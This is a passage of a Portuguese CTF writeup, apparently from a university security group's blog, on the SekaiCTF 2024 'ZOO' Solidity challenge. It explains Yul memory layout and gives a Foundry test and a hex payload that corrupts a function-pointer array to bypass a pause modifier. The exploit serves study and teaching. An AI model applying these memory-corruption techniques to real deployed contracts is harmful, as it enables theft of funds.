@@ -1,0 +1,764 @@
+<!doctype html><html class=no-js lang=pt><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>SekaiCTF 2024 writeup: Blockchain/ZOO - Blog do GRIS</title>
+<script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content="Writeup de um desafio de blockchain do SekaiCTF 2024."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://blog.gris.dcc.ufrj.br/images/GRIS_logo.png"><meta name=twitter:title content="SekaiCTF 2024 writeup: Blockchain/ZOO"><meta name=twitter:description content="Writeup de um desafio de blockchain do SekaiCTF 2024."><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=//fonts.googleapis.com><link rel=dns-prefetch href=//fonts.gstatic.com><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico><script async src="https://www.googletagmanager.com/gtag/js?id=G-YWN8S4BKK0"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-YWN8S4BKK0")}</script></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class="logo logo--mixed"><a class=logo__link href=/ title=GRIS rel=home><div class="logo__item logo__imagebox"><img class=logo__img src=/images/gris-logo-2020%27s_black.png></div><div class="logo__item logo__text"><div class=logo__title>GRIS</div><div class=logo__tagline>Grupo de Respostas a Incidentes de Segurança</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
+<span class=menu__btn-title tabindex=-1>Menu</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/about/><span class=menu__text>Sobre o GRIS</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>SekaiCTF 2024 writeup: Blockchain/ZOO</h1><div class="post__meta meta"><div class="meta__item-datetime meta__item"><svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class=meta__text datetime=2024-09-02T00:00:00Z>setembro 02, 2024</time></div></div></header><div class="content post__content clearfix"><h1 id=o-desafio>O desafio</h1><ul><li>Autor: snwo</li><li>Descrição: <em>Welcome to assembly zoo</em></li></ul><h1 id=análise-inicial>Análise inicial</h1><p>Dando uma olhada no contrato de setup,
+vemos que o objetivo final é
+setar a variável <code>isSolved</code> no contrato <code>ZOO</code> para <code>1</code>.</p><pre tabindex=0><code>contract Setup {
+    ZOO public immutable zoo;
+
+    constructor() payable {
+        zoo = new ZOO();
+    }
+
+    function isSolved() public view returns (bool) {
+        return zoo.isSolved() == 1;
+    }
+}
+</code></pre><p>Logo de cara,
+<code>ZOO</code> tem alguns pontos interessantes.
+Esse contrato implementa <code>Pausable</code>
+e chama a função <code>_pause</code> no final do construtor.
+Usando a <a href=https://docs.openzeppelin.com/contracts/4.x/api/security#Pausable>documentação</a>,
+vemos que isso é um mecanismos pra habilitar/desabilitar funções do contrato.
+Quando pausado,
+funções marcadas com o modificador <code>whenNotPaused</code>
+chamam <code>revert</code> ao serem chamadas.</p><pre tabindex=0><code>import {Animal} from &#34;./Animal.sol&#34;;
+import {Pausable} from &#34;@openzeppelin/contracts/utils/Pausable.sol&#34;;
+
+contract ZOO is Pausable {
+    uint256 public isSolved;
+    AnimalWrapper[] public animals;
+    
+    &lt;snip&gt;
+
+    constructor() {
+        &lt;snip&gt;
+
+        // The ZOO is not opened yet :(
+        _pause();   
+    }
+&lt;snip&gt;
+</code></pre><p>Seguindo a diante,
+esbarramos na função <code>commit</code>,
+que usa esse modificador.
+Essa função também tem a peculiaridade
+de ser escrita completamente em assembly.
+Ok&mldr;
+Vamos ignorar ela por enquanto,
+mas aparentemente a gente tem que despausar o contrato pra chegar nela.</p><pre tabindex=0><code>function commit(bytes memory data) internal whenNotPaused {
+    assembly {
+        &lt;snip&gt;
+    }
+}
+</code></pre><p>Por fim,
+temos uma função <code>fallback</code>.
+Essa função é especial (por isso não precisa da keyword <code>function</code>)
+e é chamada quando a assinatura especificada no calldata não existe.
+Basicamente, é a função que é chamada quando você chama uma função que não existe.
+Pra nossa infelicidade,
+basicamente tudo é escrito em assembly,
+e não é pouco código não.
+Vamos analisar o que não está em assembly então:</p><ol><li>A função aceita <code>bytes</code> como argumento.
+Esses bytes são <a href=https://solidity-by-example.org/fallback/>na verdade a calldata</a> enviada para a função.</li><li>Temos um array de <code>function(bytes memory)</code> chamado <code>functions</code>.</li><li>O único elemento desse array é a função <code>commit</code> que vimos antes.</li><li><code>commit</code> é então chamada <em>a partir desse array</em> no final da função</li></ol><pre tabindex=0><code>fallback() external payable {
+    function(bytes memory)[] memory functions = new function(
+        bytes memory
+    )[](1);
+    functions[0] = commit;
+
+    bytes memory local_animals;
+    assembly {
+        &lt;snip&gt;
+    }
+    functions[0](local_animals);
+}
+</code></pre><p>Se você já tem alguma experiência com desafios de pwn,
+esse array <code>functions</code> tá quase que gritando
+&ldquo;ME CORROMPA POR FAVOR&rdquo;.
+A única razão lógica pra
+chamar a função usando o array é
+justamente pra você conseguir corromper o endereço.
+O código não foi escrito assim por acaso.
+O fato de o que vem logo depois estar em assembly
+(único lugar que bugs de memória podem acontecer em Solidity)
+só enfatiza isso.
+Nesse contexto,
+sem nem ler o assembly nem nada,
+o caminho já tá mais ou menos claro:
+<strong>deve ter algum bug no assembly que me permite sobrescrever o array</strong>.
+Sobrescrevendo o array,
+a gente provavelmente consegue pular direto pra <code>commit</code>
+e bypassar o <code>whenNotPaused</code>.
+O que a gente faz quando chegar lá?
+Menor ideia,
+um problema de cada vez.</p><p>Dito isso,
+hora de sofrer tentando entender o assembly.
+Mas, antes disso,
+vamos entender um pouco sobre como assembly em Solidity funciona.</p><h1 id=yul>Yul</h1><p>Todo código que roda na Ethereum Virtual Machine (EVM)
+tem que ser compilado para bytecode da EVM.
+Como o nome diz,
+a EVM é uma máquina virtual
+e tem sua própria arquitetura,
+exatamente como x86 e ARM.
+Como toda arquitetura,
+a EVM tem instruções e
+essas instruções podem
+ser representadas mais facilmente a partir de assembly.
+Uma curiosidade interessante
+é que todos os <a href=https://www.evm.codes/>opcodes da EVM</a> ocupam exatamente 1 byte.
+Elegante, né?</p><p>Bom, você pode escrever código pra EVM
+instrução por instrução,
+mas felizmente isso não é necessário.
+Esses blocos <code>assembly</code> usados em Solidity
+na verdade aceitam uma linguagem chamada <a href=https://docs.soliditylang.org/en/latest/yul.html>Yul</a>,
+que é tipo um assembly turbinado.
+Em Yul,
+você chama as instruções normalmente,
+mas também existem loops, condicionais e variáveis.
+Isso facilita bastante e
+meio que abstrai a arquitetura de pilha da EVM.
+Você ainda consegue acessar as instruções diretamente,
+mas aquela parte mais chata e repetitiva de escrever assembly é feita pra você.</p><h1 id=como-funciona-a-memória-de-um-contrato-na-evm>Como funciona a memória de um contrato na EVM</h1><p>Primeiro de tudo,
+um ponto super importante:
+<strong>a EVM é uma máquina de 256 bits</strong>.
+Sendo assim,
+a stack tem entradas de 32 bytes e
+os endereços ocupam 32 bytes.
+Não é à toa que
+<code>uint</code> e <code>uint256</code> são sinônimos em Solidity:
+basicamente tudo é feito de 32 em 32 bytes.</p><p>Outro fato interessante é que
+a memória de um contrato começa em 0.
+Conforme o contrato vai usando memória,
+ela vai sendo expandida
+(e isso custa gas).</p><p>Temos também que
+as quatro primeiras words (word = 32 bytes)
+são reservadas e têm usos específicos.
+Nessa lógica,
+o espaço livre pro contrato fazer o que quiser
+começa em <code>0x80</code>.</p><pre tabindex=0><code>0x00 -&gt; scratch
+0x20 -&gt; scratch
+0x40 -&gt; free memory pointer
+0x60 -&gt; zero
+</code></pre><p>Dessas words reservadas,
+a mais importante é a terceira (fica em <code>0x40</code>).
+Nesse espaço fica o <strong>free memory pointer</strong>.
+Esse ponteiro aponta pra onde tem memória livre.
+Dessa forma,
+sempre que o programa precisa armazenar alguma coisa na memória,
+ele armazena no local onde esse ponteiro aponta
+e então move o ponteiro adiante pra algum lugar livre.</p><p>Com todo esse contexto explicado,
+vamos partir pra análise do assembly.</p><h1 id=a-função-fallback>A função fallback</h1><p>Primeiro a função usa <code>mload</code>
+pra pegar um endereço disponível no free memory pointer.
+Em seguida,
+armazena o tamanho e o conteúdo da calldata nesse espaço.
+Lembrando aqui que a calldata nesse contexto
+é exatamente a mesma coisa que o argumento passado pra função.</p><pre tabindex=0><code>// armazena calldatasize
+let arr := mload(0x40)
+let size := calldatasize()
+mstore(arr, size)
+
+// move e alinha free memory pointer
+let size_align := add(add(size, sub(0x20, mod(size, 0x20))), 0x20)
+mstore(0x40, add(arr, size_align))
+
+//  armazena calldata
+calldatacopy(add(arr, 0x20), 0, size)
+</code></pre><p>Em seguida,
+aquela variável de fora do assembly, <code>local_animals</code>,
+é alocada em um espaço de <code>0x120</code> bytes.</p><pre tabindex=0><code>local_animals := mload(0x40)
+mstore(0x40, add(local_animals, 0x120))
+</code></pre><p>Temos então um loop pra iterar
+cada byte da calldata.
+Em seguida,
+o primeiro byte da calldata é lido e salvo em <code>op</code>.
+Essa sequência de <code>mload shr add</code>
+vai se repetir bastante.</p><p>A variável <code>op</code> é então usada em um <code>switch</code>.
+Com isso,
+podemos ver que o que o assembly faz é basicamente
+ler instruções passadas via calldata,
+sendo o primeiro byte
+qual instrução queremos chamar.</p><pre tabindex=0><code>for {
+    let i := 0
+} lt(i, size) {
+
+    let op := mload(add(add(arr, 0x20), i))
+    op := shr(0xf8, op)
+    i := add(i, 1)
+
+    switch op
+    case 0x10 { &lt;snip&gt; }
+    case 0x20 { &lt;snip&gt; }
+    case 0x30 { &lt;snip&gt; }
+} {
+</code></pre><p>Vamos analisar em seguida
+as operações <code>0x10</code> e <code>0x20</code>.
+A <code>0x30</code> será ignorada
+porque não foi usada na solução desse chall.
+Ainda assim,
+foram postadas soluções diferentes no Discord do CTF
+que usam essa instrução.</p><h2 id=operação-0x10---add-animal>Operação 0x10 - Add animal</h2><p>O próximo byte da calldata é armazenado em <code>idx</code>.
+Pelo nome,
+já vemos que isso vai ser um índice.
+Em seguida,
+o código checa se o índice é maior que 7.
+Se for,
+a transação falha.</p><pre tabindex=0><code>let idx := mload(add(add(arr, 0x20), i))
+idx := shr(0xf8, idx)
+i := add(i, 1)
+
+if gt(idx, 7) {
+    revert(0, 0)
+}
+</code></pre><p>Os próximos 4 bytes
+são pra <code>name_length</code> e <code>animal_index</code>,
+cada um com 2 bytes.</p><pre tabindex=0><code>let name_length := mload(add(add(arr, 0x20), i))
+name_length := shr(0xf0, name_length)
+i := add(i, 2)
+
+let animal_index := mload(add(add(arr, 0x20), i))
+animal_index := shr(0xf0, animal_index)
+i := add(i, 2)
+</code></pre><p>O código segue pra alocar um espaço e o chama de <code>temp</code>.
+Na primeira word,
+<code>animal_index</code> é armazenado.</p><pre tabindex=0><code>let temp := mload(0x40)
+mstore(temp, animal_index)
+</code></pre><p>Temos em seguida um <code>mcopy</code>
+que copia os próximos <code>name_length</code> bytes da calldata
+pra terceira word de <code>temp</code>.</p><pre tabindex=0><code>mcopy(add(temp, 0x40), add(add(arr, 0x20), i), name_length)
+i := add(i, name_length)
+</code></pre><p>O valor em <code>name_length</code> é então alinhado
+e armazenado na segunda word de <code>temp</code>.</p><pre tabindex=0><code>name_length := add(
+    name_length,
+    sub(0x20, mod(name_length, 0x20))
+)
+mstore(add(temp, 0x20), name_length)
+</code></pre><p>Agora que <code>animal_index</code>, <code>name_length</code> e <code>name</code> foram escritos na memória,
+o free memory pointer é atualizado pra apontar pra logo depois deles.</p><pre tabindex=0><code>mstore(0x40, add(temp, add(name_length, 0x40)))
+</code></pre><p>O endereço de temp segue para ser armazenado
+em <code>(local_animals + 0x20) + (idx * 0x20)</code>.
+Com isso, vemos que <code>local_animals</code>
+é na verdade um array,
+com o endereço de seus elementos começando em <code>+ 0x20</code>.</p><pre tabindex=0><code>mstore(add(add(local_animals, 0x20), mul(0x20, idx)), temp)
+</code></pre><p>Por fim,
+vemos que a primeira word de <code>local_animals</code>
+é o tamanho do array.</p><pre tabindex=0><code>let animals_count := mload(local_animals)
+mstore(local_animals, add(animals_count, 1))
+</code></pre><p>Vamos desenhar o que acabamos de descobrir então.
+Abaixo temos o layout do array:</p><pre tabindex=0><code>+0x000 tamanho do array         &lt;---- local_animals aponta pra cá
++0x020 endereço do elemento 0
++0x040 endereço do elemento 1
++0x060 endereço do elemento 2
+...
++0x100 endereço do elemento 7
+</code></pre><p>E abaixo temos o layout de um dos elementos.
+Note que <code>animal_index</code> e <code>name_length</code>
+são lidos como números de 2 bytes da calldata,
+mas armazenados como números de 32 bytes:</p><pre tabindex=0><code>+0x00 animal_index             &lt;---- (local_animals + 0x20)[n] aponta pra cá
++0x20 name_length
++0x40 name (tamanho variável)
+</code></pre><p>Conclusão:
+a operação <code>0x10</code> recebe os argumentos
+<code>idx</code>, <code>animal_index</code>, <code>name_length</code> e <code>name</code> da calldata,
+aloca e preenche um animal com esses valores,
+e adiciona ele no array <code>local_animals</code> no índice <code>idx</code>.</p><h2 id=operação-0x20---edit-animal>Operação 0x20 - Edit animal</h2><p>Entrando no <code>case</code> da operação <code>0x20</code>,
+temos o mesmo início da operação anterior:
+o primeiro byte vai para o <code>idx</code> (que não pode ser maior que 7).</p><p>O resto do <code>case</code> pega o próximo byte e o chama de <code>edit_type</code>.
+Em seguida,
+temos um outro <code>switch</code> que se separa em dois valores para <code>edit_type</code>:
+<code>0x21</code> e <code>0x22</code>.
+Não vamos falar sobre o <code>0x22</code>,
+pois ele não foi utilizado na solução.</p><p>Quando <code>edit_type</code> é <code>0x21</code>,
+o contrato lê 2 bytes para <code>name_length</code> e
+em seguida copia os <code>name_length</code> bytes seguintes
+pra sobrescrever o <code>name</code> do animal sendo editado.</p><p>O ponto mais interessante aqui é que
+o <code>name_length</code> anterior não é verificado,
+então podemos editar um animal com um <code>name</code> maior que o anterior,
+ou seja, um overflow para o animal de baixo.</p><pre tabindex=0><code>let edit_type := mload(add(add(arr, 0x20), i))
+edit_type := shr(0xf8, edit_type)
+i := add(i, 1)
+
+switch edit_type
+case 0x21 {
+    let name_length := mload(add(add(arr, 0x20), i))
+    name_length := shr(0xf0, name_length)
+    i := add(i, 2)
+
+    mcopy(
+        add(temp, 0x40),
+        add(add(arr, 0x20), i),
+        name_length
+    )
+}
+</code></pre><h1 id=sobrescrevendo-o-array-functions>Sobrescrevendo o array functions</h1><p>Fazendo esse desafio,
+eu demorei bastante tempo pra pensar numa forma
+de sobrescrever o array <code>functions</code>.
+Afinal, o overflow que encontramos na edição de animais
+simplesmente não alcança o array,
+porque ele vem antes dos animais.</p><p>Pra entender melhor onde as coisas se situam na memória,
+podemos usar o debugger do <a href=https://github.com/foundry-rs/foundry>foundry</a>.
+Pra isso,
+basta criar um projeto novo com <code>forge init</code>
+e criar um teste.
+Como teste,
+vamos criar um animal com:</p><ul><li><code>idx = 0x00</code></li><li><code>name_length = 0x0005</code></li><li><code>index = 0xaabb</code></li><li><code>name = 0x1122334455</code></li></ul><p>Com a análise da função <code>fallback</code> que fizemos,
+vemos que basta mandar essa sequência de bytes: <code>10000005aabb1122334455</code>.
+Dessa forma,
+nosso contrato só precisa chamar <code>fallback</code>
+e passar esses bytes como argumento.
+Como <code>fallback</code> na verdade não é exatamente uma função,
+temos que usar <code>call</code> e passar nossos bytes pra ele.</p><pre tabindex=0><code>import {Test, console} from &#34;forge-std/Test.sol&#34;;
+import {ZOO} from &#34;../src/ZOO.sol&#34;;
+
+contract ZOOTest is Test {
+    ZOO public zoo;
+
+    function setUp() public {
+        zoo = new ZOO();
+    }
+
+    function test_bypass_pause() public {
+        bytes memory b = hex&#34;10000005aabb1122334455&#34;;
+        (bool success, bytes memory ret) = address(zoo).call(b);
+        if (!success) {
+            if (ret.length &gt; 0) {
+                assembly {
+                    let size := mload(ret)
+                    revert(add(0x20, ret), size)
+                }
+            } else {
+                revert(&#34;Revert without reason&#34;);
+            }
+        }
+
+        if (zoo.isSolved() == 1) {
+            console.log(&#34;Success&#34;);
+        } else {
+            console.log(&#34;Fail&#34;);
+        }
+    }
+}
+</code></pre><p>Se rodarmos o teste, vemos que ele falhou
+porque a função <code>EnforcedPause()</code> foi chamada.
+Isso é esperado,
+já que <code>commit</code> foi chamada normalmente e o contrato estava pausado,
+como vimos antes.</p><pre tabindex=0><code>$ forge test -vv
+
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/ZOO.t.sol:ZOOTest
+[FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506)
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 933.39µs (64.20µs CPU time)
+
+Ran 1 test suite in 5.14ms (933.39µs CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ZOO.t.sol:ZOOTest
+[FAIL. Reason: EnforcedPause()] test_bypass_pause() (gas: 8506)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+</code></pre><p>Pra debugar,
+é só mudar o comando pra <code>forge test --debug test_bypass_pause</code>.
+Isso vai abrir o <a href=https://book.getfoundry.sh/forge/debugger>debugger do foundry</a>,
+que nos permite executar o programa passo a passo
+e ver o que exatamente tá na memória.</p><p>Abaixo eu parei o programa logo depois
+do <code>mstore</code> que incrementa <code>animals_count</code>
+na hora de adicionar o animal.
+A overview da memória que o foundry mostra
+é meio assustura a princípio por conta da quantidade de números em cada linha,
+mas a lógica é exatamente a mesma do que você veria debugando x64.
+A diferença é que ao invés de 8 bytes por linha, são 32.</p><p>Na screenshot, basicamente tudo que o programa fez está marcado.
+Dessa forma,
+fica fácil de ver que o overflow na hora de editar um animal
+não serviria pra sobrescrever <code>functions</code>,
+porque esse array fica bem antes de onde os animais ficam.</p><p><img alt="Memória do contrato" src=/images/ottoboni-sekai-zoo/memory.png></p><h1 id=usando-animais-não-inicializados-como-trampolim-pra-bypassar-o-whennotpaused>Usando animais não inicializados como trampolim pra bypassar o whenNotPaused</h1><p>Na screenshot do debugger que vimos,
+chama atenção o fato de
+quase todo o array de animais estar zerado.
+Isso acontece porque só adicionamos um animal no índice 0,
+os outros índices ficam zerados por padrão,
+sem serem inicializados.</p><p>Na verdade,
+o código nunca checa de fato se um animal foi inicializado antes de acessá-lo.
+O que aconteceria então se editássemos um animal que não foi inicializado?
+Usando a screenshot como base,
+o segundo animal não foi inicializado.
+Se passarmos <code>idx=0x01</code>,
+<code>temp</code> será o endereço desse animal,
+no caso o endereço que é todo zeros.</p><pre tabindex=0><code>let offset := add(add(local_animals, 0x20), mul(0x20, idx)) // isso seria 0x0140
+let temp := mload(offset)                                   // isso seria 0
+</code></pre><p>Na hora de copiar o nome,
+ele será copiado para <code>0x00 + 0x40</code>,
+que é <code>0x40</code>,
+o free memory pointer.</p><pre tabindex=0><code>mcopy(
+    add(temp, 0x40),           // como temp=0, isso seria 0x40
+    add(add(arr, 0x20), i),
+    name_length
+)
+</code></pre><p>Dessa forma,
+conseguimos escrever qualquer coisa de <code>0x40</code> pra baixo,
+incluindo <code>0xa0</code>,
+que é onde o endereço da <code>commit</code> fica.
+Ainda assim,
+temos algumas questões a resolver,
+porque somos obrigados a escrever por cima
+de outros valores para chegar em <code>0xa0</code>.
+Vamos revisar eles um a um:</p><ul><li><code>0x40</code> - Esse é o free memory pointer. Intuitivamente, podemos escrever aqui qualquer coisa maior (mas não MUITO maior) ou igual ao valor original que tudo deve dar certo.</li><li><code>0x60</code> - Esse endereço é na verdade sempre zerado. Podemos simplesmente escrever zero aqui então.</li><li><code>0x80</code> - Esse é o tamanho do array functions. Só escrever <code>0x01</code> aqui pra não mudar nada.</li></ul><p>Sem problemas então,
+já sabemos o que escrever em cada endereço
+antes de chegar em <code>0x0a</code>.</p><p>Agora a questão é,
+o que escrever em <code>0x0a</code>?
+Com o debugger,
+podemos ver que o endereço que estava originalmente lá
+vai para a função <code>whenNotPaused</code>,
+do contrato <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Pausable.sol#L54>Pausable</a>.
+A primeira linha chama <code>_requireNotPaused</code>,
+que é a função que chama <code>revert</code> se o contrato estiver pausado.
+Basta então pular para onde essa função retornaria.
+Usando o debugger,
+fica fácil ver que esse endereço é <code>0x0323</code>.</p><p><img alt=Pausable.sol src=/images/ottoboni-sekai-zoo/jump.png></p><p>Finalmente,
+podemos montar nosso payload pra bypassar o <code>whenNotPaused</code>.</p><ul><li><code>0x20</code> (1 byte), pra editar um animal.</li><li><code>0x07</code> (1 byte), pra escolher o último índice (poderia ser qualquer um).</li><li><code>0x21</code> (1 byte), pra escolher o <code>edit_type</code>.</li><li><code>0x80</code> (2 bytes), porque vamos escrever 128 bytes.</li><li><code>0xffff</code> (32 bytes), pra sobrescrever o free memory pointer.</li><li><code>0x00</code> (32 bytes), pra sobrescrever o endereço que sempre tem zeros.</li><li><code>0x01</code> (32 bytes), pra sobrescrever o tamanho do array functions.</li><li><code>0x0323</code> (32 bytes), que é o endereço pra onde queremos pular.</li></ul><p>Payload: <code>2007210080000000000000000000000000000000000000000000000000000000000000ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000323</code></p><p>Depois de atualizar o contrato teste
+com esse payload e rodar o teste,
+vemos que agora não temos mais o erro dizendo que o contrato tá pausado.</p><pre tabindex=0><code>$ forge test -vv
+
+[⠊] Compiling...
+[⠊] Compiling 1 files with Solc 0.8.25
+[⠒] Solc 0.8.25 finished in 931.41ms
+Compiler run successful!
+
+Ran 1 test for test/ZOO.t.sol:ZOOTest
+[PASS] test_bypass_pause() (gas: 12362)
+Logs:
+  Fail
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.39ms (8.61ms CPU time)
+
+Ran 1 test suite in 9.84ms (9.39ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+</code></pre><p>Com o debugger,
+também é possível verificar que o valor foi sobrescrito
+e que agora o contrato está entrando na função <code>commit</code>.</p><p><img alt="Array functions sobrescrito" src=/images/ottoboni-sekai-zoo/overwritten.png></p><h1 id=objetivo-final--sstore11>Objetivo final = sstore(1,1)</h1><p>Ótimo,
+conseguimos com sucesso bypassar o <code>WhenNotPaused</code>.
+E agora?
+Agora a gente tem que descobrir
+uma forma de sobrescrever a variável <code>isSolved</code>.
+Pra isso, vamos revisar como ela foi declarada primeiro:</p><pre tabindex=0><code>contract ZOO is Pausable {
+    uint256 public isSolved;
+    &lt;snip&gt;
+}
+</code></pre><p>Essa variável <strong>não está na memória</strong>,
+ela pertence ao contrato em si
+e é armazenada na própria blockchain.
+Variáveis desse tipo ficam armazenadas no que chamam de storage.
+Pra interagir com essas variáveis,
+temos as instruções <code>sload</code> e <code>sstore</code>.
+A primeira pra ler e a segunda pra escrever.
+Cada uma dessas variáveis fica armazenada em um slot,
+que é referenciado usando um número de 32 bytes.
+Nos casos mais simples,
+tipo de um simples <code>uint256</code>,
+o número do slot simplesmente vai incrementando de 1 em 1 a partir do zero
+(a primeira variável ficaria no slot <code>0</code>, a segunda no <code>1</code> e assim por diante),
+mas tem uns casos <a href=https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html>mais enrolados</a>
+em que não é tão simples assim.</p><p>Enfim,
+esse caso é simples e <code>isSolved</code> fica no slot <code>1</code>.
+Não é no <code>0</code> porque na verdade tem uma variável escondida que armazena
+se o contrato está pausado ou não meio que implícita.
+Precisamos então setar a variável no slot <code>1</code> para <code>1</code>.
+Isso seria <code>sstore(1,1)</code> em assembly.</p><p>Vamos então analisar o assembly da <code>commit</code>
+e ver como isso poderia ser possível.
+Relaxa que essa é menor que a <code>fallback</code>.</p><h1 id=a-função-commit>A função commit</h1><p>Primeiro vamos lembrar que
+o único argumento dessa função se chama <code>data</code>
+e é aquele array que a <code>fallback</code> constrói.
+Sendo um array,
+a primeira coisa que a função faz é loopar
+cada elemento dele.
+De agora em diante todos os trechos
+serão uma iteração desse loop.</p><pre tabindex=0><code>let counter := 0
+let length := mload(data)
+
+for {
+    let i := 0
+} lt(i, length) {
+    i := add(i, 1)
+} {
+    &lt;snip&gt;
+}
+</code></pre><p>Dentro do loop,
+o <code>index</code> e <code>name_length</code> do animal são lidos.
+Detalhe que nessa função o index do animal é chamado de <code>idx</code>,
+o que tinha um significado diferente na outra função.
+Meio confuso,
+mas não fui eu que escrevi o código.</p><pre tabindex=0><code>let idx
+let name
+
+let memPtr := mload(0x40)
+
+let ptr := mload(add(add(data, 0x20), counter))
+idx := mload(ptr)
+name := add(ptr, 0x20)
+let name_length := mload(name)
+counter := add(counter, 0x20)
+</code></pre><p>Agora eu vou pular umas boas linhas de código
+que não fazem nada de relevante pra solução
+e ir direto ao ponto.
+Atenção aqui que esse é o pulo do gato.
+Temos uma varíavel <code>slot_hash</code>,
+que é o hash de um trecho de memória.
+Aqui o valor da variável não é super importante,
+só é importante saber que é um número previsível.</p><p>Temos também uma variável <code>animal_counter</code>,
+que é lida do storage usando <code>sload</code>.
+O slot do qual essa variável é lida depende de <code>idx</code>,
+um valor que a gente controla.
+O ponto importante aqui é que se <code>sload</code> recebe
+um slot nada a ver,
+que não tem nada,
+ele retorna <code>0</code>.</p><pre tabindex=0><code>let slot_hash := keccak256(0x00, 0x20);
+let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))
+</code></pre><p>Por fim,
+temos o tão esperado <code>sstore</code>.
+Só precisamos transformar os dois números que ele recebe em <code>1</code>
+e o chall está resolvido.
+O segundo argumento é fácil,
+praticamente qualquer valor de <code>idx</code> vai
+fazer com que <code>animal_counter</code> seja <code>0</code>,
+e <code>0+1=1</code>, QED.
+O primeiro argumento é um pouco (muito) mais enrolado,
+mas a gente chega lá.</p><pre tabindex=0><code>sstore(
+    add(add(slot_hash, mul(2, idx)), 1),
+    add(animal_counter, 1)
+)
+</code></pre><p>Primeiro de tudo,
+a gente realmente controla <code>idx</code>?
+Esse número é aquele primeiro campo que cada animal tem,
+e se você lembrar bem ele é armazenado em 32 bytes,
+mas a função <code>fallback</code> na verdade só aceita números de 2 bytes pra esse valor.
+Isso quer dizer que normalmente <code>0 &lt;= idx &lt; 2^16</code>,
+o que simplesmente não vai funcionar.
+Pra gente transformar aquele primeiro argumento em <code>1</code>,
+com certeza precisamos controlar os 32 bytes do <code>idx</code>.</p><h1 id=em-busca-dos-outros-30-bytes-de-idx>Em busca dos outros 30 bytes de idx</h1><p>Precisamos de uma forma de
+escrever um número qualquer de 32 bytes
+no <code>idx</code> de um animal.
+Tendo como base o caminho tomado até agora,
+a primeira maneira de fazer isso
+que veio à minha cabeça seria
+usar o overflow na operação de edição do nome do animal.</p><p>Por exemplo,
+uma forma seria criar dois animais
+e depois editar o nome do primeiro
+com um nome mais longo que o original,
+sobrescrevendo o que vem logo depois,
+que seria o <code>idx</code> do segundo animal.
+Não tem nada de errado com essa lógica,
+mas essa ideia não funciona.
+Não funciona porque a parte do código
+que edita o animal tem um bug
+que não permite que você chame a operação de edição
+mais de uma vez.
+Se você reparar,
+depois do <code>mcopy</code>,
+o valor de <code>i</code> não é incrementado,
+então as próximas instruções acabam sendo lidas
+do novo nome do animal.
+Não sei se o autor do chall esqueceu de incrementar o <code>i</code>
+ou se isso foi de propósito,
+mas isso meio que quebra a ideia de
+usar a edição pra corromper
+o <code>idx</code> do animal seguinte.</p><pre tabindex=0><code>case 0x21 {
+    let name_length := mload(add(add(arr, 0x20), i))
+    name_length := shr(0xf0, name_length)
+    i := add(i, 2)
+
+    mcopy(
+        add(temp, 0x40),
+        add(add(arr, 0x20), i),
+        name_length
+    )
+    
+    // aqui deveria ter um add(i, name_length), mas não tem :(
+}
+</code></pre><p>Outra ideia seria simplesmente aproveitar
+o overflow que a gente usou pra sobrescrever <code>functions</code>.
+A gente seguiria corrompendo a memória,
+até chegar no <code>idx</code> do primeiro animal.
+Isso também não funciona.
+Se você revisar o layout da memória que vimos antes,
+vai reparar que a calldata fica armazenada
+entre o início de onde conseguimos corromper (<code>0x40</code>)
+e onde ficaria o <code>idx</code> do primeiro animal (<code>0x220</code>).
+Isso significa que se o payload aumentar,
+a distância até onde queremos corromper também aumenta,
+porque a calldata <em>é</em> o nosso payload.
+Por conta disso é impossível corromper
+qualquer coisa que vier depois da calldata usando esse método.</p><p>A solução foi usar um outro overflow que não vimos ainda.
+No final da operação que adiciona um animal,
+a variável <code>animals_count</code> é incrementada.
+Acaba que na verdade não tem nada que
+verifica se o index onde você está adicionando um animal já está ocupado
+ou se mais de 8 animais foram criados,
+então é possível fazer <code>animals_count</code> ter um número
+bem maior que o tamanho do array.
+É só sair criando animais
+que essa variável vai sendo incrementada.</p><pre tabindex=0><code>let animals_count := mload(local_animals)
+mstore(local_animals, add(animals_count, 1))
+</code></pre><p>Por que isso é útil?
+Porque o loop na função <code>commit</code>
+itera <code>animal_count</code> vezes.
+A intenção desse loop é
+iterar cada elemento do array,
+com cada iteração lendo o endereço de um animal.
+Se <code>animal_count</code> for maior que o array,
+o loop vai começar a ler o conteúdo dos animais em si,
+que a gente controla.</p><p>A ideia então seria criar um animal
+cujo <code>idx</code> é o endereço do seu próprio nome.
+Assim, quando o loop vazar do array e chegar no primeiro animal,
